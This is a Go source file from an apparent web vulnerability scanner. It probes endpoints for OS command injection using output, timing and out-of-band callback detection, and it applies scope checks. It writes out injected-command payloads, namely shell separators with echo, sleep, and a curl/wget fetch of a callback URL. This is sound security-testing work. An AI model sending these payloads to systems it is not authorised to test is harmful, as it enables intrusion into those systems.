package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/safety"
	"auto-bughunter/backend/internal/scope"
)

// cmdInjectionBodyLimit caps response body reads during command injection probing.
const cmdInjectionBodyLimit = 64 * 1024

// cmdInjectionMaxAttempts caps how many endpoint+parameter combinations are
// tried per scan to bound total request volume.
const cmdInjectionMaxAttempts = 20

// cmdInjectionTimeSleepSeconds is the sleep duration injected by time-based
// payloads. A response time exceeding this value confirms command injection.
const cmdInjectionTimeSleepSeconds = 5

// cmdInjectionTimeThreshold is the minimum response delay (slightly more than
// the sleep payload) that triggers a time-based positive.
const cmdInjectionTimeThreshold = time.Duration(cmdInjectionTimeSleepSeconds)*time.Second + 500*time.Millisecond

// cmdInjectionOutputMarker is the unique string we look for in responses when
// using output-based detection payloads.
const cmdInjectionOutputMarker = "abh_cmdi_uid_7e3a1"

// cmdInjectionParams are parameter names that commonly flow to shell commands
// (ping targets, file paths, system utilities, conversion arguments, etc.).
var cmdInjectionParams = []string{
	"cmd", "exec", "command", "run", "shell", "query",
	"ping", "host", "ip", "addr", "address", "target",
	"file", "path", "filename", "name", "dir",
	"convert", "format", "input", "output",
}

// cmdInjectionPayloads are the injection strings tried for each parameter.
// They are ordered from least detectable (time-based) to most detectable
// (output-based). Only safe, non-destructive commands are used (id, echo).
var cmdInjectionPayloads = []struct {
	label     string
	value     string
	timeBased bool
}{
	// Output-based: inject echo of unique marker via common separators.
	{label: "semicolon-echo", value: ";echo " + cmdInjectionOutputMarker, timeBased: false},
	{label: "pipe-echo", value: "|echo " + cmdInjectionOutputMarker, timeBased: false},
	{label: "ampersand-echo", value: "&echo " + cmdInjectionOutputMarker, timeBased: false},
	{label: "backtick-echo", value: "`echo " + cmdInjectionOutputMarker + "`", timeBased: false},
	{label: "subshell-echo", value: "$(echo " + cmdInjectionOutputMarker + ")", timeBased: false},
	{label: "newline-echo", value: "%0aecho " + cmdInjectionOutputMarker, timeBased: false},
	// Time-based: sleep to detect blind injection without output.
	{label: "semicolon-sleep", value: fmt.Sprintf(";sleep %d", cmdInjectionTimeSleepSeconds), timeBased: true},
	{label: "pipe-sleep", value: fmt.Sprintf("|sleep %d", cmdInjectionTimeSleepSeconds), timeBased: true},
	{label: "subshell-sleep", value: fmt.Sprintf("$(sleep %d)", cmdInjectionTimeSleepSeconds), timeBased: true},
}

// runCommandInjectionProbe is an active probe covering WSTG-INPV-12. It
// complements the optional Commix integration with a native, lightweight check:
//
//  1. Output-based detection: injects command separators + "echo <marker>" and
//     checks whether the marker appears in the response body.
//  2. Time-based blind detection: injects "sleep N" and flags when the
//     response takes materially longer than the baseline.
//  3. OAST-based detection (when an OAST service is configured): injects a
//     DNS/HTTP callback URL and waits briefly for a callback.
func (s *Service) runCommandInjectionProbe(ctx context.Context, input RunInput, bodyText string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}

	candidates := extractRuntimeEndpoints(input.Target, bodyText, input.Scope, 8)
	if len(input.Options.SeedRuntimeEndpoints) > 0 {
		candidates = append(candidates, input.Options.SeedRuntimeEndpoints...)
	}
	if len(candidates) == 0 {
		candidates = []string{input.Target}
	}

	if input.Emit != nil {
		input.Emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("command-injection %s", input.Target),
			Message: "Probing for OS command injection via output, time, and OAST signals",
		})
	}

	var findings []model.Finding
	emitted := map[string]bool{}
	attempts := 0

	for _, raw := range candidates {
		if attempts >= cmdInjectionMaxAttempts {
			break
		}
		raw = strings.TrimSpace(raw)
		if raw == "" {
			continue
		}
		if err := safety.ValidateOutboundURL(raw); err != nil {
			continue
		}
		if !scope.IsURLInScope(raw, input.Scope) {
			continue
		}

		base, err := url.Parse(raw)
		if err != nil || base.Scheme == "" || base.Host == "" {
			continue
		}

		baselineControls, _ := s.phase1QueryBaselines(ctx, raw, "abh_cmdi_control", "safe", true, input, cmdInjectionBodyLimit)

		// Phase 2 reference wiring: merge miner-discovered parameter names
		// in front of the built-in command-injection wordlist (see
		// PHASE2_AUDIT.md).
		probeParams := phase2ProbeParams(phase2DynamicParams(input.Session), cmdInjectionParams)

		for _, param := range probeParams {
			if attempts >= cmdInjectionMaxAttempts {
				break
			}

			for _, payload := range cmdInjectionPayloads {
				if attempts >= cmdInjectionMaxAttempts {
					break
				}
				fid := "cmd-injection-" + payload.label + "-" + hhSlug(raw) + "-" + param
				if emitted[fid] {
					continue
				}

				q := url.Values{}
				q.Set(param, payload.value)
				probeURL := url.URL{
					Scheme:   base.Scheme,
					Host:     base.Host,
					Path:     base.Path,
					RawQuery: q.Encode(),
				}

				start := time.Now()
				req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL.String(), nil)
				if err != nil {
					continue
				}
				ApplyAuthProfile(req, input.AuthProfile)

				resp, err := s.doRequestWithRetry(ctx, req, input.Options)
				elapsed := time.Since(start)
				attempts++
				// Phase 2 coverage accounting: record this probe key so the
				// surface-gap detector subtracts it from the inventory.
				RecordProbedKey(http.MethodGet, probeURL.String(), param)

				if err != nil || resp == nil {
					continue
				}
				respBody, _ := io.ReadAll(io.LimitReader(resp.Body, cmdInjectionBodyLimit))
				respHeader := resp.Header
				_ = resp.Body.Close()
				if IsBinaryShape(respHeader) {
					continue
				}

				// Output-based detection.
				if !payload.timeBased && strings.Contains(string(respBody), cmdInjectionOutputMarker) {
					if phase1BaselineContains(baselineControls, cmdInjectionOutputMarker) {
						continue
					}
					diffOutcome := phase1DifferentialQuery(ctx, s, input, "command-injection", probeURL.String(), param, payload.value, "127.0.0.1", cmdInjectionBodyLimit,
						func(_ context.Context, _ string, _ *http.Response, body []byte) (bool, error) {
							return strings.Contains(string(body), cmdInjectionOutputMarker), nil
						})
					if diffOutcome.Ran && !diffOutcome.Confirmed {
						continue
					}
					emitted[fid] = true
					curl := buildCurlReproducer(http.MethodGet, probeURL.String(), input.AuthProfile, "", "")
					refCtx := ClassifyReflectionContext("<body>"+string(respBody)+"</body>", cmdInjectionOutputMarker)
					finding := model.Finding{
						ID:       fid,
						Category: "injection",
						Severity: model.SeverityCritical,
						Title:    fmt.Sprintf("OS command injection — output-based confirmation (param=%q, technique=%s)", param, payload.label),
						Description: fmt.Sprintf(
							"The endpoint %s is vulnerable to OS command injection via the %q parameter. "+
								"The payload %q caused the server to execute 'echo' and return the output marker "+
								"%q in the response body. An attacker can use arbitrary OS commands to read "+
								"sensitive files, enumerate the system, establish reverse shells, or pivot to "+
								"internal services.",
							raw, param, payload.value, cmdInjectionOutputMarker,
						),
						Evidence: fmt.Sprintf(
							"GET %s → HTTP %d; response body contained %q",
							probeURL.String(), resp.StatusCode, cmdInjectionOutputMarker,
						),
						Recommendation: "Never pass user-supplied input to shell commands. Use language-native APIs " +
							"(e.g. os.exec without shell=True, child_process.execFile instead of exec in Node.js). " +
							"If a shell call is unavoidable, validate input against a strict allowlist and use " +
							"argument escaping (shlex.quote in Python, escapeshellarg in PHP).",
						Confidence:        0.95,
						AffectedURL:       raw,
						AffectedParameter: param,
						CWE:               "CWE-78",
						OWASPCategory:     "A03:2021 - Injection",
						Sources:           []string{"active-scanner", "command-injection"},
						ReproductionSteps: []string{
							fmt.Sprintf("GET %s", probeURL.String()),
							fmt.Sprintf("Observe %q in response body.", cmdInjectionOutputMarker),
						},
						PoC: curl,
						EvidenceFields: map[string]string{
							"validationType":    "active-probe",
							"technique":         payload.label,
							"param":             param,
							"payload":           payload.value,
							"responseStatus":    fmt.Sprintf("%d", resp.StatusCode),
							"responseShape":     ClassifyResponseShape(respHeader).String(),
							"reflectionContext": refCtx.String(),
						},
					}
					AttachDifferentialEvidence(&finding, diffOutcome)
					emittedFinding, ok := phase1SubmitVerified(ctx, finding, "command-injection", []EvidenceSignal{EvidenceReflection, EvidenceSinkObserved}, "command-injection")
					if !ok {
						continue
					}
					findings = append(findings, emittedFinding)
					break
				}

				// Time-based detection.
				if payload.timeBased && elapsed >= cmdInjectionTimeThreshold && phase1TimingExceeds(elapsed, baselineControls.First.Duration, baselineControls.Second.Duration) {
					diffOutcome := phase1DifferentialQuery(ctx, s, input, "command-injection", probeURL.String(), param, payload.value, "127.0.0.1", cmdInjectionBodyLimit,
						func(dctx context.Context, alt string, _ *http.Response, _ []byte) (bool, error) {
							start := time.Now()
							_, err := s.phase1GETSample(dctx, mustPhase1QueryURL(probeURL.String(), param, alt), input, cmdInjectionBodyLimit)
							return time.Since(start) >= cmdInjectionTimeThreshold, err
						})
					if diffOutcome.Ran && !diffOutcome.Confirmed {
						continue
					}
					emitted[fid] = true
					finding := model.Finding{
						ID:       fid,
						Category: "injection",
						Severity: model.SeverityHigh,
						Title:    fmt.Sprintf("Possible OS command injection — time-based detection (param=%q, technique=%s)", param, payload.label),
						Description: fmt.Sprintf(
							"The endpoint %s showed a significant response-time increase (%dms vs baseline %dms) "+
								"when the %q parameter received a sleep-based injection payload (%q). "+
								"This pattern is consistent with blind OS command injection where the server executes "+
								"the injected sleep command before returning the response.",
							raw, elapsed.Milliseconds(), baselineControls.First.Duration.Milliseconds(), param, payload.value,
						),
						Evidence: fmt.Sprintf(
							"GET %s → elapsed %dms (baseline: %dms, threshold: %dms)",
							probeURL.String(), elapsed.Milliseconds(), baselineControls.First.Duration.Milliseconds(), cmdInjectionTimeThreshold.Milliseconds(),
						),
						Recommendation: "Never pass user-supplied input to shell commands. Use language-native APIs " +
							"without a shell. Validate all input against strict allowlists and use parameterised " +
							"subprocess calls. Conduct further investigation to confirm exploitability.",
						Confidence:        0.75,
						AffectedURL:       raw,
						AffectedParameter: param,
						CWE:               "CWE-78",
						OWASPCategory:     "A03:2021 - Injection",
						Sources:           []string{"active-scanner", "command-injection"},
						ReproductionSteps: []string{
							fmt.Sprintf("GET %s", probeURL.String()),
							fmt.Sprintf("Observe response delay ≥ %ds confirming sleep execution.", cmdInjectionTimeSleepSeconds),
						},
						EvidenceFields: map[string]string{
							"validationType": "active-probe",
							"technique":      payload.label,
							"param":          param,
							"payload":        payload.value,
							"elapsedMs":      fmt.Sprintf("%d", elapsed.Milliseconds()),
							"baselineMs":     phase1FormatBaselineMs(baselineControls),
							"responseStatus": fmt.Sprintf("%d", resp.StatusCode),
							"responseShape":  ClassifyResponseShape(respHeader).String(),
						},
					}
					AttachDifferentialEvidence(&finding, diffOutcome)
					emittedFinding, ok := phase1SubmitVerified(ctx, finding, "command-injection", []EvidenceSignal{EvidenceTimingDelta, EvidenceSinkObserved}, "command-injection")
					if !ok {
						continue
					}
					findings = append(findings, emittedFinding)
					break
				}
			}
		}

		// OAST-based detection (blind, no output).
		if s.oast != nil && s.oast.Configured() {
			if f := s.probeCommandInjectionOAST(ctx, raw, input); f != nil && !emitted[f.ID] {
				emitted[f.ID] = true
				findings = append(findings, *f)
			}
		}
	}

	return findings
}

// measureBaselineLatency returns the average of two baseline GET request
// durations to the target, used as the reference latency for time-based
// detection. Falls back to 0 on error.
func (s *Service) measureBaselineLatency(ctx context.Context, target string, input RunInput) time.Duration {
	var total time.Duration
	for i := 0; i < 2; i++ {
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
		if err != nil {
			continue
		}
		ApplyAuthProfile(req, input.AuthProfile)
		start := time.Now()
		resp, err := s.doRequestWithRetry(ctx, req, input.Options)
		elapsed := time.Since(start)
		if err == nil && resp != nil {
			_ = resp.Body.Close()
			total += elapsed
		}
	}
	return total / 2
}

// probeCommandInjectionOAST injects an OAST callback URL as a parameter value
// and waits briefly for a DNS/HTTP callback that confirms blind command
// injection (e.g. via wget/curl of the callback URL).
func (s *Service) probeCommandInjectionOAST(ctx context.Context, target string, input RunInput) *model.Finding {
	tok := s.oast.Issue("", "cmd-injection-oast")
	if tok.CallbackURL == "" {
		return nil
	}

	base, err := url.Parse(target)
	if err != nil || base.Scheme == "" || base.Host == "" {
		return nil
	}

	// Inject curl/wget command that fetches the OAST callback URL.
	for _, param := range []string{"cmd", "exec", "ping", "host"} {
		payload := fmt.Sprintf(";curl -s %s||wget -q %s", tok.CallbackURL, tok.CallbackURL)
		q := url.Values{}
		q.Set(param, payload)
		probeURL := url.URL{Scheme: base.Scheme, Host: base.Host, Path: base.Path, RawQuery: q.Encode()}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL.String(), nil)
		if err != nil {
			continue
		}
		ApplyAuthProfile(req, input.AuthProfile)
		resp, err := s.doRequestWithRetry(ctx, req, input.Options)
		RecordProbedKey(http.MethodGet, probeURL.String(), param)
		if err == nil && resp != nil {
			_ = resp.Body.Close()
		}
	}

	wait := defaultOASTSSRFWait
	hits := s.oast.Wait(tok.Token, wait)
	if len(hits) == 0 {
		return nil
	}

	fid := "cmd-injection-oast-" + hhSlug(target)
	return &model.Finding{
		ID:       fid,
		Category: "injection",
		Severity: model.SeverityCritical,
		Title:    "OS command injection — OAST callback confirmed (blind)",
		Description: fmt.Sprintf(
			"The endpoint %s is vulnerable to blind OS command injection. An OAST callback was received "+
				"after injecting a curl/wget command into common shell-execution parameters. "+
				"This confirms that user-supplied input reaches a shell and the server has outbound "+
				"network access, enabling exfiltration, reverse shells, and lateral movement.",
			target,
		),
		Evidence: fmt.Sprintf("OAST callback received from %s: %d hit(s)", target, len(hits)),
		Recommendation: "Never pass user-supplied input to shell commands. Use language-native APIs " +
			"without a shell interpreter. Apply strict input allowlist validation and subprocess argument escaping.",
		Confidence:    0.95,
		AffectedURL:   target,
		CWE:           "CWE-78",
		OWASPCategory: "A03:2021 - Injection",
		Sources:       []string{"active-scanner", "command-injection", "oast"},
		EvidenceFields: map[string]string{
			"validationType": "oast-callback",
			"callbackURL":    tok.CallbackURL,
			"hits":           fmt.Sprintf("%d", len(hits)),
		},
	}
}

// checkOutputMarker returns true when body contains the OS command injection
// output marker, confirming execution. Extracted for testability.
func checkOutputMarker(body string) bool {
	return strings.Contains(body, cmdInjectionOutputMarker)
}
